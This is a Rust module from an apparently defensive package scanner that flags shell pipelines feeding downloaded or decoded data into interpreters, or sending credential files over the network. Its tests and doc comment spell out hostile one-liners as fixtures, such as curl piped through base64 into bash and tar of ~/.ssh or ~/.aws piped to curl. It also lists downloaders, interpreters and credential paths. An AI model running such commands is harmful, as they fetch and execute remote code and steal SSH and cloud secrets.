//! Pipe-chain classification.
//!
//! `P-CURL-PIPE` compiles to `curl\s[^|\n]*\|\s*(ba)?sh`, which cannot cross an
//! intermediate stage. That is exactly the shape the July 2026 campaign used
//! and the shape that scored only SKETCHY in testing:
//!
//! ```text
//! curl -s https://x/y | base64 -d | bash
//! ```
//!
//! This module splits a command line on top-level `|` and classifies each
//! stage, so a chain is judged by what flows into what rather than by whether
//! two words happen to be adjacent. Only executable regions are read; heredoc
//! bodies and comments cannot produce a finding.

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::normalize::NormalizedView;
use crate::shared::scoring::{Signal, SignalCategory, SignalRole};

/// Points for download-or-decode into an interpreter. This is remote code
/// execution, so it gates.
const POINTS_DOWNLOAD_EXEC: u32 = 95;
const POINTS_DECODE_EXEC: u32 = 90;
/// Reading a credential store and sending it out is exfiltration.
const POINTS_EXFIL: u32 = 95;

/// Programs that fetch remote content.
const DOWNLOADERS: &[&str] = &[
    "curl", "wget", "aria2c", "lwp-download", "lwp-request", "fetch", "tftp", "nc", "ncat",
    "socat",
];

/// Programs that turn an encoded blob back into text.
const DECODERS: &[&str] = &[
    "base64", "base32", "xxd", "openssl", "gzip", "gunzip", "bunzip2", "xz", "unxz", "zstd",
    "uuencode", "uudecode", "tr",
];

/// Interpreters that execute their input.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "fish", "python", "python2", "python3",
    "perl", "ruby", "php", "lua", "node", "nodejs", "deno", "bun", "Rscript", "julia", "tclsh",
    "wish", "awk", "gawk", "mawk", "nawk", "source", ".",
];

/// Paths whose contents are secrets, not build inputs.
const CREDENTIAL_PATHS: &[&str] = &[
    ".ssh/", "id_rsa", "id_ed25519", "id_ecdsa", ".aws/", ".netrc", ".npmrc", ".pypirc",
    ".config/gh/", ".kube/", ".gnupg/", ".docker/config.json", ".git-credentials", "/etc/shadow",
    ".local/share/keyrings", ".config/BraveSoftware", ".mozilla", ".config/google-chrome",
    "Library/Keychains",
];

pub struct PipeChainAnalysis;

impl Feature for PipeChainAnalysis {
    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let mut signals = Vec::new();
        if let Some(ref content) = ctx.pkgbuild_content {
            signals.extend(analyze_content(content, "", ""));
        }
        if let Some(ref content) = ctx.install_script_content {
            signals.extend(analyze_content(content, "IS-", "(in install script)"));
        }
        signals
    }
}

fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
    // Callers pass either "" or " (in install script)"; keep the separator in
    // one place so descriptions never read `pipeline(in install script)`.
    let desc_suffix = if desc_suffix.is_empty() {
        String::new()
    } else {
        format!(" {}", desc_suffix.trim())
    };
    let desc_suffix = desc_suffix.as_str();
    let view = NormalizedView::new(content);
    let text = view.masked();
    let structure = view.structure();

    // Function bodies plus top-level statements; data regions excluded. A
    // sourced config file or a build step can run a pipeline with no function
    // wrapper, which a strict inside-a-function rule missed.
    let ranges = structure.statement_ranges();

    let chars: Vec<char> = text.chars().collect();
    let mut signals = Vec::new();
    let mut reported_exfil = false;

    for range in ranges {
        let mut line_start = range.start;
        while line_start < range.end {
            let mut line_end = line_start;
            while line_end < range.end && chars[line_end] != '\n' {
                line_end += 1;
            }
            let line: String = chars[line_start..line_end].iter().collect();
            let spans = split_top_level_pipes(&line);

            if spans.len() >= 2 {
                let stages: Vec<&str> = spans
                    .iter()
                    .map(|s| s.as_str())
                    .filter(|s| !s.trim().is_empty())
                    .collect();
                if let Some((kind, description)) = classify_chain(&stages) {
                    let (id, points) = match kind {
                        ChainKind::DownloadExec => ("SA-PIPE-DOWNLOAD-EXEC", POINTS_DOWNLOAD_EXEC),
                        ChainKind::DecodeExec => ("SA-PIPE-DECODE-EXEC", POINTS_DECODE_EXEC),
                    };
                    signals.push(
                        Signal::new(&format!("{id_prefix}{id}"), SignalCategory::Pkgbuild, points)
                            .with_role(SignalRole::Composition)
                            .with_description(format!("{description}{desc_suffix}"))
                            .with_line(line.trim().to_string())
                            .as_gate(),
                    );
                }

                // Exfiltration is a pipe too, but with a different shape: a
                // credential read in one stage, a network send in another.
                if !reported_exfil
                    && spans.iter().any(|s| reads_credentials(s))
                    && spans.iter().any(|s| sends_over_network(s))
                {
                    reported_exfil = true;
                    signals.push(
                        Signal::new(
                            &format!("{id_prefix}SA-EXFIL-PIPE"),
                            SignalCategory::Behavioral,
                            POINTS_EXFIL,
                        )
                        .with_role(SignalRole::Composition)
                        .with_description(format!(
                            "credential directory read and sent over the network in one pipeline{desc_suffix}"
                        ))
                        .with_line(line.trim().to_string())
                        .as_gate(),
                    );
                }
            }

            line_start = line_end + 1;
        }
    }

    signals
}

#[derive(Debug, PartialEq, Eq)]
enum ChainKind {
    DownloadExec,
    DecodeExec,
}

/// Classify an ordered list of pipeline stages.
///
/// Order matters: a decoder *before* an interpreter means the interpreter is
/// fed decoded text. A decoder *after* the interpreter is ordinary use.
fn classify_chain(stages: &[&str]) -> Option<(ChainKind, String)> {
    let mut seen_download: Option<&str> = None;
    let mut seen_decode: Option<&str> = None;

    for stage in stages {
        if let Some(prog) = first_program(stage) {
            if let Some(dl) = DOWNLOADERS.iter().find(|d| **d == prog) {
                seen_download.get_or_insert(dl);
                continue;
            }
            if let Some(dec) = DECODERS.iter().find(|d| **d == prog) {
                // Only a *decoding* invocation counts; `gzip -9` compresses.
                if decoder_is_decoding(stage, prog) {
                    seen_decode.get_or_insert(dec);
                }
                continue;
            }
            if let Some(interp) = INTERPRETERS.iter().find(|i| **i == prog) {
                if let Some(dl) = seen_download {
                    return Some((
                        ChainKind::DownloadExec,
                        format!("'{dl}' output piped into '{interp}'"),
                    ));
                }
                if let Some(dec) = seen_decode {
                    return Some((
                        ChainKind::DecodeExec,
                        format!("'{dec}' output piped into '{interp}'"),
                    ));
                }
            }
        }
    }
    None
}

/// The program a stage runs, skipping `sudo`, `env`, `xargs`, variable
/// assignments and leading parentheses.
fn first_program(stage: &str) -> Option<&str> {
    let mut s = stage.trim();
    loop {
        // `VAR=$(curl ...)` and `VAR="$(curl ...)"`: strip the assignment so the
        // command inside the substitution is what gets classified.
        if let Some(rest) = strip_assignment(s) {
            s = rest;
            continue;
        }
        s = s.trim_start_matches(|c: char| c == '(' || c.is_whitespace());
        let word: &str = s.split(|c: char| c.is_whitespace() || c == ';').next()?;
        if word.is_empty() {
            return None;
        }
        match word {
            // Wrappers: the real program follows.
            "sudo" | "doas" | "env" | "nohup" | "command" | "exec" | "xargs" | "timeout"
            | "nice" | "stdbuf" => {
                s = &s[word.len()..];
                // Skip `sudo -u root`, `timeout 5`, and `VAR=value` prefixes.
                while let Some(next) = s.trim_start().split_whitespace().next() {
                    let skip = next.starts_with('-')
                        || next.chars().all(|c| c.is_ascii_digit())
                        || (next.contains('=') && !next.contains('/'));
                    if !skip {
                        break;
                    }
                    let idx = s.find(next).unwrap_or(0);
                    s = &s[idx + next.len()..];
                }
                continue;
            }
            _ => {
                if word.contains('=') && !word.starts_with('-') {
                    // `VAR=1 curl ...`
                    s = &s[word.len()..];
                    continue;
                }
                // Strip a path (/usr/bin/curl -> curl) and any closing syntax
                // left by a subshell (`bash)` -> bash).
                let bare = word.trim_end_matches([')', ';', '"', '\'']);
                return Some(bare.rsplit('/').next().unwrap_or(bare));
            }
        }
    }
}

/// Strip a leading `NAME=` / `NAME="` assignment, returning the remainder.
fn strip_assignment(s: &str) -> Option<&str> {
    let eq = s.find('=')?;
    let name = &s[..eq];
    let valid_name = !name.is_empty()
        && !name.contains([' ', '/', '(', ')', '|', '"', '\''])
        && name.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_');
    if !valid_name {
        return None;
    }
    let rest = s[eq + 1..].trim_start();
    // Drop a quote that opened a value, and the `$` of a substitution.
    let rest = rest.trim_start_matches(['"', '\'']).trim_start();
    let rest = rest.strip_prefix('$').unwrap_or(rest);
    let rest = rest.strip_prefix('(').unwrap_or(rest);
    Some(rest.trim_start())
}

/// Whether a decoder stage actually decodes rather than encodes/compresses.
fn decoder_is_decoding(stage: &str, prog: &str) -> bool {
    let lower = stage.to_lowercase();
    match prog {
        "base64" | "base32" => lower.contains(" -d") || lower.contains("--decode") || lower.contains(" -D"),
        "xxd" => lower.contains("-r"),
        "openssl" => lower.contains("enc -d") || lower.contains("base64 -d") || lower.contains(" -d "),
        "gzip" | "gunzip" | "bunzip2" | "xz" | "unxz" | "zstd" => {
            prog != "gzip" && prog != "xz" || lower.contains(" -d")
        }
        // `tr` is a weak signal on its own; only rot13/atbash style use counts.
        "tr" => lower.contains("rot13"),
        _ => true,
    }
}

/// Whether a stage reads a credential path.
///
/// Matches each path both with and without its trailing slash, because
/// `/root/.ssh` (no slash) is as common as `~/.ssh/keys`.
fn reads_credentials(stage: &str) -> bool {
    CREDENTIAL_PATHS.iter().any(|p| {
        let bare = p.trim_end_matches('/');
        stage.contains(p) || (!bare.is_empty() && stage.contains(bare))
    })
}

/// Whether a stage sends data out.
fn sends_over_network(stage: &str) -> bool {
    let Some(prog) = first_program(stage) else {
        return false;
    };
    if DOWNLOADERS.contains(&prog) {
        return true;
    }
    let lower = stage.to_lowercase();
    lower.contains("/dev/tcp/")
        || lower.contains("urllib")
        || lower.contains("requests.post")
        || lower.contains("http.client")
        || lower.contains("smtplib")
        // A discord/telegram/webhook POST is the usual exfil channel.
        || (lower.contains("curl") && lower.contains(" -d "))
        || (lower.contains("curl") && lower.contains("--data"))
        || (lower.contains("wget") && lower.contains("--post"))
}

/// Split a line on `|` that is not inside quotes or `||`.
fn split_top_level_pipes(line: &str) -> Vec<String> {
    // Normalise quote splitting first so `cu""rl x | ba""sh` yields stages that
    // start with the command name rather than an empty string.
    let line = crate::shared::shell_normalize::strip_quotes(line);
    let chars: Vec<char> = line.chars().collect();
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut i = 0;

    // A command substitution re-enters command context: `$(a | b)` runs a
    // pipeline. Track the paren depth of `$(` so those pipes split.
    let mut subst_depth = 0i32;

    while i < chars.len() {
        let c = chars[i];
        match c {
            '$' if chars.get(i + 1) == Some(&'(') => {
                current.push('$');
                current.push('(');
                subst_depth += 1;
                i += 2;
                continue;
            }
            '|' if chars.get(i + 1) == Some(&'|') => {
                // `a || b` is control flow, not a pipe.
                current.push('|');
                current.push('|');
                i += 2;
                continue;
            }
            '|' => {
                parts.push(std::mem::take(&mut current));
                i += 1;
                continue;
            }
            // Quote content is data. `strip_quotes` already removed the quoting
            // that matters; what remains inside quotes is an argument, so a
            // literal `|` there is not a stage boundary.
            '\'' | '"' => {
                let quote = c;
                current.push(c);
                i += 1;
                while i < chars.len() {
                    let inner = chars[i];
                    if inner == '\\' && quote == '"' && i + 1 < chars.len() {
                        current.push(inner);
                        current.push(chars[i + 1]);
                        i += 2;
                        continue;
                    }
                    current.push(inner);
                    i += 1;
                    if inner == quote {
                        break;
                    }
                }
                continue;
            }
            ')' => {
                if subst_depth > 0 {
                    subst_depth -= 1;
                }
                current.push(c);
                i += 1;
                continue;
            }
            _ => {
                current.push(c);
                i += 1;
                continue;
            }
        }
    }
    parts.push(current);
    parts
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx(pkgbuild: &str) -> PackageContext {
        PackageContext {
            name: "test".into(),
            metadata: None,
            pkgbuild_content: Some(pkgbuild.to_string()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
            github_stars: None,
            github_not_found: false,
            aur_comments: vec![],
            local_sources: vec![],
            source_path: None,
            incomplete: vec![],
        }
    }

    fn ids(pkgbuild: &str) -> Vec<String> {
        PipeChainAnalysis
            .analyze(&ctx(pkgbuild))
            .into_iter()
            .map(|s| s.id)
            .collect()
    }

    #[test]
    fn curl_into_base64_into_bash_is_download_exec() {
        // The chain starts at a downloader, so the site reports the download
        // origin; either composition gates.
        let got = ids("build() {\n  curl -s https://x/y | base64 -d | bash\n}\n");
        assert!(
            got.iter().any(|id| id.ends_with("PIPE-DOWNLOAD-EXEC")
                || id.ends_with("PIPE-DECODE-EXEC")),
            "{got:?}"
        );
    }

    #[test]
    fn wget_into_shell_is_download_exec() {
        let got = ids("build() {\n  wget -qO- https://x/y | sh\n}\n");
        assert!(got.contains(&"SA-PIPE-DOWNLOAD-EXEC".to_string()), "{got:?}");
    }

    #[test]
    fn multiple_decoders_then_python() {
        let got = ids("build() {\n  printf aGk= | openssl enc -d -base64 | gunzip | python3\n}\n");
        assert!(got.contains(&"SA-PIPE-DECODE-EXEC".to_string()), "{got:?}");
    }

    #[test]
    fn sed_extracting_a_version_is_clean() {
        let got = ids("build() {\n  ver=$(curl -s https://x | sed -n 's/v//p')\n}\n");
        assert!(got.is_empty(), "{got:?}");
    }

    #[test]
    fn tar_xz_and_git_archive_are_clean() {
        let got = ids(
            "build() {\n  curl -s https://x/a.tgz | tar xz\n  wget -O f https://x/b\n}\n",
        );
        assert!(got.is_empty(), "{got:?}");
    }

    #[test]
    fn encode_direction_is_not_a_decode() {
        let got = ids("build() {\n  echo hi | base64 | sh\n}\n");
        assert!(got.is_empty(), "{got:?}");
    }

    #[test]
    fn credential_pipe_is_exfil() {
        let got = ids(
            "post_install() {\n  tar czf - /root/.ssh | base64 -w0 | xargs -I{} curl -s -d {} https://x/c\n}\n",
        );
        assert!(got.contains(&"SA-EXFIL-PIPE".to_string()), "{got:?}");
    }

    #[test]
    fn credential_pipe_with_form_encoded_wrapper_is_exfil() {
        let got = ids("build() {\n  tar c ~/.aws | curl --form f=@- https://x/u\n}\n");
        assert!(got.contains(&"SA-EXFIL-PIPE".to_string()), "{got:?}");
    }

    #[test]
    fn plain_backup_without_network_is_clean() {
        let got = ids("build() {\n  tar czf ~/backup.tgz ~/.ssh\n}\n");
        assert!(got.is_empty(), "{got:?}");
    }

    #[test]
    fn double_pipe_control_flow_is_ignored() {
        let got = ids("build() {\n  curl -s x || bash fallback.sh\n}\n");
        assert!(got.is_empty(), "{got:?}");
    }

    #[test]
    fn pipe_inside_quotes_is_not_a_stage_split() {
        // A quoted `|` stays inside its stage, so no download/decode flows into
        // an interpreter.
        let stages = split_top_level_pipes("echo 'a | bash' && curl x");
        assert!(
            !stages
                .iter()
                .any(|s| classify_chain(&[s.as_str(), "bash"]).is_some()),
            "{stages:?}"
        );
        let got = ids("build() {\n  echo 'payload | bash' > notes.txt\n}\n");
        assert!(got.is_empty(), "{got:?}");
    }

    #[test]
    fn pipe_inside_command_substitution_is_split() {
        // `x="$(curl … | bash)"` executes the pipeline; it must split.
        let stages = split_top_level_pipes("_p=\"$(curl -s x | base64 -d | bash)\"");
        assert!(stages.len() >= 3, "{stages:?}");
        let got = ids("build() {\n  _p=\"$(curl -s x | base64 -d | bash)\"\n}\n");
        assert!(
            got.iter().any(|id| id.contains("PIPE-")),
            "subshell pipeline must be detected: {got:?}"
        );
    }

    #[test]
    fn path_prefixed_program_is_recognised() {
        let got = ids("build() {\n  /usr/bin/curl -s x | /bin/bash\n}\n");
        assert!(got.contains(&"SA-PIPE-DOWNLOAD-EXEC".to_string()), "{got:?}");
    }

    #[test]
    fn sudo_prefixed_program_is_recognised() {
        let got = ids("build() {\n  curl -s x | sudo -E bash\n}\n");
        assert!(got.contains(&"SA-PIPE-DOWNLOAD-EXEC".to_string()), "{got:?}");
    }

    #[test]
    fn heredoc_body_is_not_scanned() {
        let got = ids("build() {\n  cat <<EOF >x\ncurl x | bash\nEOF\n}\n");
        assert!(got.is_empty(), "{got:?}");
    }

    #[test]
    fn gate_reaches_malicious() {
        use crate::shared::scoring::{ScanStatus, Tier, compute_score_with_status};
        let signals = PipeChainAnalysis.analyze(&ctx(
            "build() {\n  curl -s https://x/y | base64 -d | bash\n}\n",
        ));
        let result = compute_score_with_status("pkg", &signals, ScanStatus::Complete, None);
        assert_eq!(result.tier, Tier::Malicious);
    }
}
